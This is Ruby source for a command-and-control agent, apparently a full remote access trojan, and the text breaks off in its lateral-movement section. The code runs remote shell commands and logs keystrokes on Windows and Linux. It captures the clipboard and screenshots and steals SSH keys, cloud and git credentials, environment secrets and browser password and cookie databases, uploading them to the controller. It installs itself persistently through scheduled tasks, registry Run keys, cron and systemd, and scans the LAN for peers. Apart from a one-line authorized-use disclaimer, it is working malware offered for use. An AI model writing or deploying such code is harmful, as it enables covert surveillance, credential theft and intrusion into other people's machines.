#!/usr/bin/env ruby
# agent.rb — C2 agent, Ruby port (stdlib only).
#
# Run:
#   ruby agent.rb --server http://127.0.0.1:8000 --token <AGENT_TOKEN> --interval 10 --verbose
#   C2_SERVER=... C2_TOKEN=... ruby agent.rb
#
# Only use against systems you own or are authorized to test.

require 'net/http'
require 'uri'
require 'json'
require 'fileutils'
require 'optparse'
require 'tmpdir'
require 'socket'
require 'open3'

# ---------------------------------------------------------------- constants

SHELL_TIMEOUT = 120
OUTPUT_LIMIT  = 12000
$STATE_FILE   = ENV['C2_STATE_FILE'] || File.join(Dir.home, '.c2agent.json')
$windows      = !!(RUBY_PLATFORM =~ /mswin|mingw|cygwin/)

# ---------------------------------------------------------------- globals

$server   = ''
$token    = ''
$agent_id = ''
$interval = (ENV['C2_INTERVAL'] || 10).to_i
$jitter   = (ENV['C2_JITTER']   || 0).to_i
$verbose  = %w[1 true].include?(ENV['C2_VERBOSE'])
$clone_watchers = {}

# ---------------------------------------------------------------- helpers

def logmsg(msg)
  $stderr.puts "[*] #{msg}" if $verbose
end

def truncate_output(text)
  return text if text.length <= OUTPUT_LIMIT
  head = OUTPUT_LIMIT / 5
  tail = OUTPUT_LIMIT - head - 40
  omitted = text.length - head - tail
  "#{text[0...head]}\n... [#{omitted} chars truncated] ...\n#{text[-tail..]}"
end

def local_ip
  begin
    udp = UDPSocket.new
    udp.connect('8.8.8.8', 80)
    ip = udp.addr[3]
    udp.close
    return ip
  rescue StandardError
    ''
  end
end

def os_name
  case RUBY_PLATFORM
  when /mswin|mingw|cygwin/ then 'windows'
  when /darwin/ then 'darwin'
  when /linux/ then 'linux'
  else RUBY_PLATFORM
  end
end

STEAL_KEYWORDS = %w[
  token secret password passwd key= api auth
  aws azure google github gitlab slack discord
  cookie session credential access proxy login
].freeze

STEAL_TOKEN_FILES = %w[
  .aws/credentials .aws/config
  .git-credentials .netrc .npmrc .pypirc
  .pip/pip.conf .config/pip/pip.conf
  .config/gh/hosts.yml .config/rclone/rclone.conf
  .config/gcloud/credentials.json .config/gcloud/access_tokens.db
  .docker/config.json .kube/config
  .ssh/id_rsa .ssh/id_ed25519 .ssh/id_ecdsa .ssh/config
  .ssh/known_hosts .ssh/authorized_keys
].freeze

STEAL_MAX_FILE = 8 * 1024 * 1024

CHROMIUM_PROFILE_FILES = %w[Login Data Cookies Web Data].freeze
FIREFOX_PROFILE_FILES  = %w[cookies.sqlite logins.json key4.db cert9.db].freeze

def shell_escape(s)
  "'#{s.gsub("'", "'\\\\''")}'"
end

# ---------------------------------------------------------------- JSON HTTP

def _utf8_safe(str)
  str.to_s.encode('UTF-8', invalid: :replace, undef: :replace)
end

def _sanitize_json(obj)
  case obj
  when Hash then obj.map { |k, v| [k, _sanitize_json(v)] }.to_h
  when Array then obj.map { |v| _sanitize_json(v) }
  when String then _utf8_safe(obj)
  else obj
  end
end

def safe_json(obj)
  JSON.generate(obj)
rescue JSON::GeneratorError, Encoding::UndefinedConversionError
  JSON.generate(_sanitize_json(obj))
end

def post_json(path, body)
  uri = URI.parse("#{$server}#{path}")
  http = Net::HTTP.new(uri.host, uri.port)
  http.open_timeout = 15
  http.read_timeout = 15
  http.use_ssl = (uri.scheme == 'https')

  req = Net::HTTP::Post.new(uri.path.empty? ? '/' : uri.path)
  req['Content-Type'] = 'application/json'
  req['X-Agent-Token'] = $token
  req.body = safe_json(body)

  begin
    res = http.request(req)
    { body: res.body, code: res.code.to_i }
  rescue StandardError => e
    { body: '', code: 0, error: e.message }
  end
end

def get_url(path)
  uri = URI.parse("#{$server}#{path}")
  http = Net::HTTP.new(uri.host, uri.port)
  http.open_timeout = 15
  http.read_timeout = 120
  http.use_ssl = (uri.scheme == 'https')

  req = Net::HTTP::Get.new(uri.path.empty? ? '/' : uri.path)
  req['X-Agent-Token'] = $token

  begin
    res = http.request(req)
    { body: res.body, code: res.code.to_i }
  rescue StandardError => e
    { body: '', code: 0, error: e.message }
  end
end

# ---------------------------------------------------------------- state

def load_id
  return unless File.exist?($STATE_FILE)
  data = JSON.parse(File.read($STATE_FILE)) rescue {}
  $agent_id = data['agent_id'] || ''
end

def save_id
  File.write($STATE_FILE, JSON.generate('agent_id' => $agent_id))
end

# ------------------------------------------------------------- lifecycle

def register
  hostname = begin
    Socket.gethostname.strip
  rescue StandardError
    'unknown'
  end
  username = begin
    ENV['USERNAME'] || ENV['USER'] || ENV['USERPROFILE']&.split('\\')&.last || ''
  rescue StandardError
    ''
  end
  arch = begin
    if $windows
      ENV['PROCESSOR_ARCHITECTURE'] || RbConfig::CONFIG['host_cpu']
    else
      RbConfig::CONFIG['host_cpu']
    end
  rescue StandardError
    ''
  end
  body = {
    'agent_id' => $agent_id.empty? ? nil : $agent_id,
    'hostname' => hostname,
    'username' => username,
    'os'       => os_name,
    'arch'     => arch,
    'pid'      => Process.pid,
    'ip'       => local_ip,
    'version'  => '1.0',
    'type'     => 'Ruby',
  }
  logmsg "registering with #{$server}"
  res = post_json('/api/register', body)
  if res[:code] != 200
    $stderr.puts "register failed: HTTP #{res[:code]} (will retry on next checkin)"
    return
  end
  data = JSON.parse(res[:body]) rescue {}
  $agent_id = data['agent_id'] || ''
  save_id
  logmsg "agent id: #{$agent_id}"
end

def checkin
  res = post_json('/api/checkin', { 'agent_id' => $agent_id })
  if res[:code] == 404
    logmsg 'server does not know us — re-registering'
    register
    return []
  end
  return [] unless res[:code] == 200
  data = JSON.parse(res[:body]) rescue {}
  data['tasks'] || []
end

def report(task_id, output, exit_code, error = '')
  post_json('/api/result', {
    'agent_id'  => $agent_id,
    'task_id'   => task_id,
    'output'    => output || '',
    'exit_code' => exit_code,
    'error'     => error || '',
  })
end

# ---------------------------------------------------------------- tasks

def run_shell(command, timeout = SHELL_TIMEOUT)
  timeout = [[timeout.to_i, 1].max, 3600].min
  logmsg "executing: #{command}"
  begin
    # pgroup is unsupported on Windows Ruby; cmd.exe has no process groups,
    # so there we target the child by its own PID instead.
    if $windows
      shell = ENV['COMSPEC'] || 'cmd.exe'
      cmdline = ['/c', command]
    else
      shell = ENV['SHELL'] || '/bin/sh'
      cmdline = ['-c', command]
    end
    compat = { pgroup: true }
    compat = {} if $windows
    Open3.popen2e(shell, *cmdline, **compat) do |stdin, stdout, wait_thr|
      stdin.close
      pid = wait_thr.pid
      deadline = Time.now + timeout
      timed_out = false
      out = +''
      begin
        loop do
          remaining = deadline - Time.now
          if remaining <= 0
            timed_out = true
            break
          end
          ready = IO.select([stdout], nil, nil, remaining)
          break unless ready
          begin
            out << stdout.read_nonblock(65_536)
          rescue EOFError
            break
          rescue IO::WaitReadable
            next
          end
        end
      ensure
        # Drain anything left so wait_thr.value completes.
        begin
          loop { out << stdout.read_nonblock(65_536) }
        rescue EOFError, IO::WaitReadable
          nil
        end
      end

      if timed_out
        # Kill the whole process group, then fall back to the leader only.
        begin
          if $windows
            Process.kill('KILL', pid)
          else
            Process.kill('KILL', -pid, pid)
          end
        rescue ArgumentError, Errno::ESRCH, Errno::EPERM
          begin
            Process.kill('KILL', pid)
          rescue ArgumentError, Errno::ESRCH, Errno::EPERM
            nil
          end
        end
        ["#{_utf8_safe(out)}command timed out (#{timeout}s)".sub(/\n\z/, ''), 124]
      else
        status = wait_thr.value.exitstatus || 1
        [_utf8_safe(out), status]
      end
    end
  rescue StandardError => e
    ["error: #{e.message}", 1]
  end
end

def task_download(task_id, args)
  fname = args['file'] || 'payload.bin'
  dest = args['destination'] || fname
  logmsg "downloading #{fname} to #{dest}"

  res = get_url("/api/files/#{task_id}")
  return ["download failed: HTTP #{res[:code]}", 1] if res[:code] != 200

  if dest.end_with?('/', '\\')
    dest = File.join(dest, File.basename(fname))
  elsif File.directory?(dest)
    dest = File.join(dest, File.basename(fname))
  end
  FileUtils.mkdir_p(File.dirname(dest)) rescue nil
  File.open(dest, 'wb') { |f| f.write(res[:body]) }
  ["saved #{res[:body].length} bytes to #{dest}", 0]
end

def task_upload(task_id, args)
  path = args['path'] || ''
  return ['no path given', 1] if path.empty?
  return ["file not found: #{path}", 1] unless File.exist?(path)
  logmsg "uploading #{path}"

  uri = URI.parse("#{$server}/api/files/#{task_id}")
  http = Net::HTTP.new(uri.host, uri.port)
  http.open_timeout = 15
  http.read_timeout = 300
  http.use_ssl = (uri.scheme == 'https')

  file_data = File.binread(path)
  boundary = "----c2agent#{Time.now.to_i}"
  body = "--#{boundary}\r\n" \
         "Content-Disposition: form-data; name=\"file\"; filename=\"#{File.basename(path)}\"\r\n" \
         "Content-Type: application/octet-stream\r\n\r\n" \
         "#{file_data}\r\n--#{boundary}--\r\n"

  req = Net::HTTP::Post.new(uri.path)
  req['Content-Type'] = "multipart/form-data; boundary=#{boundary}"
  req['X-Agent-Token'] = $token
  req.body = body

  begin
    res = http.request(req)
    if res.code.to_i == 200
      ["uploaded #{path}", 0]
    else
      ["upload failed: HTTP #{res.code}", 1]
    end
  rescue StandardError => e
    ["upload error: #{e.message}", 1]
  end
end

def task_sleep(args)
  secs = (args['seconds'] || 10).to_i
  secs = 1 if secs < 1
  $interval = secs
  ["heartbeat interval set to #{$interval}s", 0]
end

# ---------------------------------------------------------------- keylog
# File-based keystroke logger. 'start' spawns a background collector
# (PowerShell GetAsyncKeyState on Windows, xinput->awk on Linux) that appends
# to a log file; 'dump' stops the collector and returns the captured text.

KEYLOG_PS = <<~'PS'
  $C2P = $env:C2P; $C2K = $env:C2K
  [IO.File]::WriteAllText($C2P, [string]$PID)
  Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class K{[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int v);[DllImport("user32.dll")]public static extern short GetKeyState(int v);}'
  $l = New-Object 'bool[]' 256
  while (1) {
    Start-Sleep -Milliseconds 25
    for ($v = 8; $v -le 190; $v++) {
      $d = (([K]::GetAsyncKeyState($v) -band 1) -ne 0)
      if ($d -ne $l[$v]) {
        if ($d) {
          $c = $null
          if ($v -ge 65 -and $v -le 90) { $sh = (([K]::GetAsyncKeyState(16) -band 0x8000) -ne 0); $cp = (([K]::GetKeyState(20) -band 1) -ne 0); $c = [char]($v + $(if ($sh -ne $cp) { 0 } else { 32 })) }
          elseif ($v -ge 48 -and $v -le 57) { $c = [char]$v } elseif ($v -eq 32) { $c = ' ' }
          elseif ($v -eq 13) { $c = [char]10 } elseif ($v -eq 9) { $c = '[TAB]' }
          elseif ($v -eq 8) { $c = '[BACKSPACE]' } elseif ($v -eq 27) { $c = '[ESC]' } elseif ($v -eq 46) { $c = '[DEL]' }
          elseif ($v -eq 37) { $c = '[LEFT]' } elseif ($v -eq 38) { $c = '[UP]' }
          elseif ($v -eq 39) { $c = '[RIGHT]' } elseif ($v -eq 40) { $c = '[DOWN]' }
          elseif ($v -ge 112 -and $v -le 123) { $c = '[F' + ($v - 111) + ']' }
          elseif ($v -eq 186) { $c = ';' } elseif ($v -eq 187) { $c = '=' }
          elseif ($v -eq 188) { $c = ',' } elseif ($v -eq 189) { $c = '-' }
          elseif ($v -eq 190) { $c = '.' } elseif ($v -eq 191) { $c = '/' }
          elseif ($v -eq 192) { $c = '`' } elseif ($v -eq 219) { $c = '[' }
          elseif ($v -eq 220) { $c = '\' } elseif ($v -eq 221) { $c = ']' }
          elseif ($v -eq 222) { $c = "'" }
          if ($c) { [IO.File]::AppendAllText($C2K, [string]$c) }
        }
        $l[$v] = $d
      }
    }
  }
PS

KEYLOG_SH = <<~'SH'
  #!/bin/sh
  C2P=${C2P:-/tmp/.c2nope}; C2K=${C2K:-/tmp/.c2nope}
  echo $$ > "$C2P"
  kid=$(xinput list 2>/dev/null | grep -i -m1 keyboard | sed -E 's/.*id=([0-9]+).*/\1/')
  [ -z "$kid" ] && exit 1
  xinput test "$kid" 2>/dev/null | awk -v p="$C2K" '
  BEGIN { n = split("2 3 4 5 6 7 8 9 10 11 16 17 18 19 20 21 22 23 24 25 30 31 32 33 34 35 36 37 38 44 45 46 47 48 49 50", a, " "); s = "1234567890qwertyuiopasdfghjklzxcvbnm"; for (i = 1; i <= length(s); i++) m[a[i]] = substr(s, i, 1) }
  { if ($1 == "key" && $2 == "press") { c = m[$3]; if ($3 == 57) c = " "; else if ($3 == 28) c = "\n"; else if ($3 == 15) c = "[TAB]"; else if ($3 == 14) c = "[BACKSPACE]"; else if ($3 == 1) c = "[ESC]"; else if ($3 == 111) c = "[DEL]"; else if ($3 == 42 || $3 == 54) c = "[SHIFT]"; else if ($3 == 29 || $3 == 97) c = "[CTRL]"; else if ($3 == 56 || $3 == 100) c = "[ALT]"; if (c != "") printf "%s", c > p } }'
SH

def klog_base
  File.join(Dir.tmpdir, ".c2keylog_#{$agent_id}")
end

def proc_alive?(pid)
  return false if pid.to_i <= 0
  if os_name == 'windows'
    system("tasklist /FI \"PID eq #{pid}\" >NUL 2>NUL")
  else
    begin
      Process.kill(0, pid.to_i)
      true
    rescue Errno::ESRCH
      false
    end
  end
end

def klog_write_collectors
  base = klog_base
  File.write("#{base}.ps", KEYLOG_PS)
  File.write("#{base}.sh", KEYLOG_SH)
end

def klog_start
  base = klog_base
  pidf = "#{base}.pid"
  if File.exist?(pidf) && proc_alive?(File.read(pidf).strip)
    return 'keylogger already running'
  end
  klog_write_collectors
  File.delete("#{base}.log") rescue nil
  case os_name
  when 'windows'
    system({ 'C2P' => pidf, 'C2K' => "#{base}.log" },
           "powershell -NoProfile -Command \"Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File','#{base}.ps'\"")
  when 'darwin'
    return 'error: keylogger not supported on macOS'
  else
    system({ 'C2P' => pidf, 'C2K' => "#{base}.log" },
           "sh -c \"nohup sh '#{base}.sh' >/dev/null 2>&1 &\"")
  end
  25.times do
    break if File.exist?(pidf)
    sleep 0.1
  end
  return 'keylogger started' if File.exist?(pidf)
  'error: no keylogging tool available (powershell/xinput needed)'
end

def klog_stop
  base = klog_base
  pidf = "#{base}.pid"
  return 'keylogger not running' unless File.exist?(pidf)
  pid = File.read(pidf).strip
  if proc_alive?(pid)
    if os_name == 'windows'
      system("taskkill /PID #{pid} /F /T >NUL 2>&1")
    else
      Process.kill('KILL', pid.to_i) rescue nil
    end
  end
  File.delete(pidf) rescue nil
  'keylogger stopped'
end

def klog_dump
  out = klog_stop
  return [out, 0] unless %w[keylogger\ stopped keylogger\ not\ running].include?(out)
  logf = "#{klog_base}.log"
  text = (File.exist?(logf) ? (File.binread(logf) rescue '') : '').to_s
  if text.empty?
    ['(no keystrokes recorded)', 0]
  else
    text = "...#{text[-8000..]}" if text.length > 8000
    [text, 0]
  end
end

def task_keylog(args)
  action = (args['action'] || 'dump').downcase
  case action
  when 'start'
    m = klog_start
    [m, m.start_with?('error:') ? 1 : 0]
  when 'stop'
    m = klog_stop
    [m, m.start_with?('error:') ? 1 : 0]
  else
    klog_dump
  end
end

def task_clipboard(args)
  action = (args['action'] || 'get').downcase
  begin
    if action == 'set'
      text = args['text'] || ''
      case os_name
      when 'windows'
        IO.popen(['powershell', '-NoProfile', '-Command',
                  'Set-Clipboard -Value ([Console]::In.ReadToEnd())'], 'w') { |io| io.write(text) }
      when 'darwin'
        IO.popen('pbcopy', 'w') { |io| io.write(text) }
      else
        IO.popen('xclip -selection clipboard', 'w') { |io| io.write(text) }
      end
      ['clipboard set', 0]
    else
      case os_name
      when 'windows'
        text = `powershell -command Get-Clipboard`.strip rescue ''
      when 'darwin'
        text = `pbpaste 2>/dev/null` rescue ''
      else
        text = `xclip -selection clipboard -o 2>/dev/null` rescue ''
      end
      [text, 0]
    end
  rescue StandardError => e
    ["error: #{e.message}", 1]
  end
end

def task_screenshot(task_id, args)
  label = (args['name'] || 'screenshot').gsub(/\s+/, '')
  label = 'screenshot' if label.empty?
  tmp = File.join(Dir.tmpdir, "c2shot_#{Time.now.to_i}_#{rand(1000)}.png")
  case os_name
  when 'windows'
    `powershell -command "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;$bmp=New-Object System.Drawing.Bitmap($b.Width,$b.Height);$g=[System.Drawing.Graphics]::FromImage($bmp);$g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size);$bmp.Save('#{tmp.gsub('\\', '/')}');"`
  when 'darwin'
    `screencapture -x '#{tmp}'`
  else
    %w[import scrot gnome-screenshot].each do |tool|
      next if `command -v #{tool}`.strip.empty?
      cmd = case tool
            when 'import' then "import -window root '#{tmp}'"
            when 'scrot' then "scrot '#{tmp}'"
            else "gnome-screenshot -f '#{tmp}'"
            end
      system(cmd)
      break if File.exist?(tmp) && File.size(tmp) > 0
    end
  end

  unless File.exist?(tmp) && File.size(tmp) > 0
    return ['error: screenshot failed (no tool or permission)', 1]
  end

  file_data = File.binread(tmp)
  File.delete(tmp) rescue nil
  boundary = "----C2Shot#{Time.now.to_i}"
  body = "--#{boundary}\r\n" \
         "Content-Disposition: form-data; name=\"file\"; filename=\"#{label}.png\"\r\n" \
         "Content-Type: image/png\r\n\r\n" \
         "#{file_data}\r\n--#{boundary}--\r\n"

  uri = URI.parse("#{$server}/api/files/#{task_id}")
  http = Net::HTTP.new(uri.host, uri.port)
  http.open_timeout = 15
  http.read_timeout = 120
  http.use_ssl = (uri.scheme == 'https')

  req = Net::HTTP::Post.new(uri.path)
  req['Content-Type'] = "multipart/form-data; boundary=#{boundary}"
  req['X-Agent-Token'] = $token
  req.body = body

  begin
    res = http.request(req)
    if res.code.to_i == 200
      ["screenshot saved (#{label}.png)", 0]
    else
      ["screenshot upload failed: HTTP #{res.code}", 1]
    end
  rescue StandardError => e
    ["screenshot error: #{e.message}", 1]
  end
end

# ---------------------------------------------------------------- clone
def task_clone_start(args)
  target = (args['target'] || '').strip
  target = $agent_id if target.empty?
  command = (args['command'] || '').strip
  interval = begin
    [[(args['interval'] || 30).to_i, 5].max, 3600].min
  rescue StandardError
    30
  end

  if $clone_watchers.key?(target)
    return ["clone: watcher for #{target} already running", 1]
  end
  return ["clone: 'command' (relaunch cmd) required", 1] if command.empty?

  info = { status: 'starting', last_check: 'never', relaunches: 0, command: command, stopped: false }
  mutex = Mutex.new
  thread = Thread.new(target, command, interval, info, mutex) do |tgt, cmd, int, inf, mx|
    begin
      loop do
        mx.synchronize { break if inf[:stopped] }
        res = get_url("/api/clone/status/#{tgt}")
        if res[:code] == 404
          inf[:status] = 'unknown'
          inf[:last_check] = 'target gone'
        elsif res[:code] == 200
          data = JSON.parse(res[:body]) rescue {}
          st = data['status'] || 'unknown'
          inf[:status] = st
          inf[:last_check] = Time.now.utc.strftime('%Y-%m-%d %H:%M:%S')
          if %w[dead stale].include?(st) && !cmd.empty?
            mx.synchronize { break if inf[:stopped] }
            mx.synchronize { inf[:relaunches] += 1 }
            logmsg "clone: target #{tgt} #{st} -> relaunching"
            begin
              if $windows
                shell = ENV['COMSPEC'] || 'cmd.exe'
                Process.spawn(shell, '/c', 'start', '/b', cmd,
                              out: 'NUL', err: 'NUL', detached: true)
              else
                Process.spawn(cmd, [:out, :err] => File::NULL, pgroup: true, close_others: true)
              end
            rescue StandardError => e
              logmsg "clone: relaunch failed: #{e.message}"
            end
          end
        else
          inf[:status] = "http #{res[:code]}"
          inf[:last_check] = Time.now.utc.strftime('%Y-%m-%d %H:%M:%S')
        end
        mx.synchronize { break if inf[:stopped] }
        sleep(int) rescue nil
      end
    rescue StandardError => e
      logmsg "clone: thread error: #{e.message}"
    end
  end
  $clone_watchers[target] = { thread: thread, mutex: mutex, info: info }
  ["clone: watcher started on target #{target} (every #{interval}s, restart cmd: #{command})", 0]
end

def task_clone_stop(args)
  target = (args['target'] || '').strip
  target = $agent_id if target.empty?
  entry = $clone_watchers.delete(target)
  return ["clone: no watcher for #{target}", 1] unless entry
  entry[:mutex].synchronize { entry[:info][:stopped] = true }
  entry[:thread].join(timeout: 10) rescue nil
  ["clone: watcher for #{target} stopped", 0]
end

def task_clone_status(_args)
  return ['clone: no watchers running', 0] if $clone_watchers.empty?
  lines = $clone_watchers.map do |tid, entry|
    inf = entry[:info]
    "  #{tid}: #{inf[:status]} | last_check #{inf[:last_check]} | " \
    "relaunched #{inf[:relaunches]}x | cmd: #{inf[:command] || '(none)'}"
  end
  ["clone watchers:\n#{lines.sort.join("\n")}", 0]
end

def task_clone(args)
  action = (args['action'] || 'start').strip.downcase
  case action
  when 'stop'  then task_clone_stop(args)
  when 'status' then task_clone_status(args)
  else task_clone_start(args)
  end
end

# ---------------------------------------------------------------- steal
def steal_safe_copy(src, dst_dir)
  return false unless File.exist?(src)
  return false if File.size(src) > STEAL_MAX_FILE
  FileUtils.mkdir_p(dst_dir) rescue nil
  FileUtils.cp2(src, File.join(dst_dir, File.basename(src)))
  true
rescue StandardError
  false
end

def steal_env(work)
  lines = []
  ENV.each do |k, v|
    low = k.downcase
    lines << "#{k}=#{v}" if STEAL_KEYWORDS.any? { |w| low.include?(w) }
  end
  return [] if lines.empty?
  path = File.join(work, 'env.txt')
  File.write(path, lines.sort.join("\n") + "\n", encoding: 'UTF-8')
  ['env.txt']
rescue StandardError
  []
end

def steal_tokens(work)
  home = Dir.home
  hits = []
  STEAL_TOKEN_FILES.each do |rel|
    src = File.join(home, rel)
    if steal_safe_copy(src, File.join(work, 'tokens'))
      hits << "tokens/#{File.basename(rel)}"
    end
  end
  hits
rescue StandardError
  []
end

def browser_roots
  roots = {}
  home = Dir.home
  if $windows
    la = ENV['LOCALAPPDATA'] || ''
    appd = ENV['APPDATA'] || ''
    %w[Google/Chrome/UserData Microsoft/Edge/UserData
       BraveSoftware/Brave-Browser/UserData OperaSoftware/Opera.Stable].each do |rel|
      roots[File.join(la, rel)] = 'chromium' unless la.empty?
    end
    roots[File.join(appd, 'Mozilla/Firefox/Profiles')] = 'firefox' unless appd.empty?
  elsif os_name == 'darwin'
    base = File.join(home, 'Library/Application Support')
    %w[Google/Chrome Microsoft/Edge BraveSoftware/Brave-Browser].each do |name|
      roots[File.join(base, name)] = 'chromium'
    end
    roots[File.join(base, 'Firefox/Profiles')] = 'firefox'
  else
    %w[google-chrome chromium].each do |rel|
      roots[File.join(home, '.config', rel)] = 'chromium'
    end
    %w[microsoft-edge msedge].each do |rel|
      roots[File.join(home, '.config', rel)] = 'chromium'
    end
    %w[brave-browser brave].each do |rel|
      roots[File.join(home, '.config', rel)] = 'chromium'
    end
    roots[File.join(home, '.config/opera')] = 'chromium'
    roots[File.join(home, '.mozilla/firefox')] = 'firefox'
  end
  roots
end

def steal_browser(work)
  hits = []
  browser_roots.each do |root, kind|
    next unless File.directory?(root)
    targets = kind == 'firefox' ? FIREFOX_PROFILE_FILES : CHROMIUM_PROFILE_FILES
    Dir.glob(File.join(root, '**', '*')).select { |f| File.directory?(f) }.each do |dirpath|
      targets.each do |fn|
        fp = File.join(dirpath, fn)
        next unless File.exist?(fp)
        rel = Pathname.new(dirpath).relative_path_from(Pathname.new(root)).to_s
        dst = File.join(work, 'browser', kind, rel.tr(File::SEPARATOR, '__'))
        if steal_safe_copy(fp, dst)
          hits << "browser/#{kind}/#{rel.tr(File::SEPARATOR, '__')}/#{fn}"
        end
      end
    end
  end
  hits
rescue StandardError
  []
end

def task_steal(task_id, args)
  profile = (args['profile'] || 'all').to_s.strip.downcase
  profile = 'all' unless %w[all env tokens browser].include?(profile)
  work = Dir.mktmpdir('c2steal_')
  manifest = []
  begin
    if %w[all env].include?(profile)
      logmsg 'steal: collecting env vars'
      manifest.concat(steal_env(work))
    end
    if %w[all tokens].include?(profile)
      logmsg 'steal: collecting token files'
      manifest.concat(steal_tokens(work))
    end
    if %w[all browser].include?(profile)
      logmsg 'steal: collecting browser dbs'
      manifest.concat(steal_browser(work))
    end
    if manifest.empty?
      FileUtils.rm_rf(work)
      return ["steal (#{profile}): nothing found", 1]
    end
    File.write(File.join(work, 'manifest.txt'), manifest.sort.join("\n") + "\n")
    archive = File.join(work, 'steal.zip')
    zipped = system("cd \"#{work}\" && zip -r steal.zip . >#{File::NULL} 2>&1") rescue false
    unless zipped
      tar_archive = "#{archive}.tar"
      system("tar cf \"#{tar_archive}\" -C \"#{work}\" . 2>#{File::NULL}") rescue false
      archive = tar_archive
    end
    return ['steal: no zip or tar available', 1] unless File.exist?(archive)
    file_data = File.binread(archive)
    boundary = "----C2Steal#{Time.now.to_i}"
    fname = zipped ? 'steal.zip' : 'steal.zip.tar'
    body = "--#{boundary}\r\n" \
           "Content-Disposition: form-data; name=\"file\"; filename=\"#{fname}\"\r\n" \
           "Content-Type: application/octet-stream\r\n\r\n" \
           "#{file_data}\r\n--#{boundary}--\r\n"
    uri = URI.parse("#{$server}/api/files/#{task_id}")
    http = Net::HTTP.new(uri.host, uri.port)
    http.open_timeout = 15
    http.read_timeout = 300
    http.use_ssl = (uri.scheme == 'https')
    req = Net::HTTP::Post.new(uri.path)
    req['Content-Type'] = "multipart/form-data; boundary=#{boundary}"
    req['X-Agent-Token'] = $token
    req.body = body
    res = http.request(req)
    if res.code.to_i != 200
      return ["steal upload failed: HTTP #{res.code}", 1]
    end
    size = File.size(archive)
    listing = manifest.join("\n")
    [truncate_output(
      "stole #{manifest.size} item(s) -> #{fname} (#{size} bytes)\n#{listing}", 4000
    ), 0]
  rescue StandardError => e
    ["error: #{e.message}", 1]
  ensure
    FileUtils.rm_rf(work) rescue nil
  end
end

# ---------------------------------------------------------------- persistence
def relaunch_cmd(dest, interp = nil)
  interp ||= (RbConfig.ruby rescue 'ruby')
  if $windows
    q = ->(s) { "\"#{s}\"" }
    "#{q[interp]} #{q[dest]} --server #{q[$server]} --token #{q[$token]} --interval #{$interval} --jitter #{$jitter}"
  else
    "#{interp} #{shell_escape(dest)} --server #{shell_escape($server)} --token #{shell_escape($token)} --interval #{$interval} --jitter #{$jitter}"
  end
end

def sh_embed(s)
  s.gsub("'", "'\\''")
end

def task_persistence(_args)
  begin
    self_path = File.expand_path($0)
    if $windows
      base = File.join(ENV['APPDATA'] || Dir.home, 'Microsoft', 'Windows', 'c2update')
      FileUtils.mkdir_p(base) rescue nil
      dest = File.join(base, 'c2agent' + File.extname(self_path))
      FileUtils.cp(self_path, dest) rescue (raise "cannot copy self to #{dest}")
      relaunch = relaunch_cmd(dest)
      output = "persistence: copied self to #{dest}"
      progdata = ENV['ProgramData'] || ENV['ALLUSERSPROFILE'] || 'C:\\ProgramData'
      launcher_dir = File.join(progdata, 'c2update')
      FileUtils.mkdir_p(launcher_dir) rescue nil
      wrapper = File.join(launcher_dir, 'c2relaunch.cmd')
      File.write(wrapper, "@echo off\r\nstart \"\" /b #{relaunch}\r\n")
      output += "\npersistence: wrote launcher #{wrapper}"
      task = run_shell("schtasks /Create /TN \"c2agent-persist\" /TR \"#{wrapper}\" /SC ONLOGON /RL HIGHEST /F", 30)
      ok = task[1].zero?
      output += "\n#{task[0].strip}"
      unless ok
        reg = run_shell("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v c2agent /t REG_SZ /d \"#{wrapper}\" /f", 30)
        ok = reg[1].zero?
        output += "\n#{reg[0].strip}"
      end
      [truncate_output(output), ok ? 0 : 1]
    else
      base = File.join(Dir.home, '.config', 'c2update')
      FileUtils.mkdir_p(base) rescue nil
      dest = File.join(base, File.basename(self_path))
      FileUtils.cp(self_path, dest) rescue (raise "cannot copy self to #{dest}")
      relaunch = relaunch_cmd(dest)
      cron_line = "@reboot #{relaunch} # c2agent-persist"
      cron = run_shell("(crontab -l 2>/dev/null | grep -v 'c2agent-persist'; echo '#{sh_embed(cron_line)}') | crontab -", 30)
      ok = cron[1].zero?
      output = "persistence: copied self to #{dest}\n#{cron[0].strip}"
      unit = File.join(base, 'c2-update.service')
      File.write(unit,
        "[Unit]\nDescription=c2 update\n\n" \
        "[Service]\nType=simple\nExecStart=/bin/sh -c '#{sh_embed(relaunch)}'\nRestart=always\n\n" \
        "[Install]\nWantedBy=default.target\n")
      sd = run_shell('systemctl --user daemon-reload; systemctl --user enable --now c2-update.service', 30)
      ok = ok || sd[1].zero?
      output += "\n#{sd[0].strip}"
      [truncate_output(output), ok ? 0 : 1]
    end
  rescue StandardError => e
    ["persistence: error: #{e.message}", 1]
  end
end

# ---------------------------------------------------------------- lateral
def lateral_base(args)
  own = local_ip
  own_base = own[/^(\d{1,3}\.\d{1,3}\.\d{1,3})\.\d{1,3}$/, 1]
  sub = (args['subnet'] || '').to_s.strip
  return sub if sub =~ /^\d{1,3}\.\d{1,3}\.\d{1,3}$/
  own_base || ''
end

def lateral_peers(base, own)
  peers = {}
  cmds = $windows ? ['arp -a'] : ['arp -a', 'ip neigh']
  cmds.each do |cmd|
    out, = run_shell(cmd, 20)
    out.scan(/\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b/) do |m|
      ip = m[0]
      next unless ip.start_with?("#{base}.")
      next if !own.empty? && ip == own
      next if ip.split('.').any? { |p| p.to_i > 255 }
      peers[ip] = true
    end
  end
  peers.keys.sort.take(30)
end

def err_brief(result)
  t = result[0].to_s.strip
  brief = t.split("\n").reject { |l| l.strip.empty? }[0, 3].join("\n")
  brief = t if brief.empty?
  brief.length > 200 ? "#{brief[0, 200]}..." : brief
end

def task_lateral(args)
  base = lateral_base(args)
  return ['lateral: no LAN peers found', 1] if base.empty?
  own = local_ip
  peers = lateral_peers(base, own)
  return ['lateral: no LAN peers found', 1] if peers.empty?

  user = (args['user'] || '').to_s
  user = ENV['C2_LAT_USER'].to_s if user.empty?
  pass = (args['pass'] || '').to_s
  pass = ENV['C2_LAT_PASS'].to_s if pass.empty?
  has_creds = !user.empty? && !pass.empty?
  self_path = File.expand_path($0)
  basename = File.basename($0)

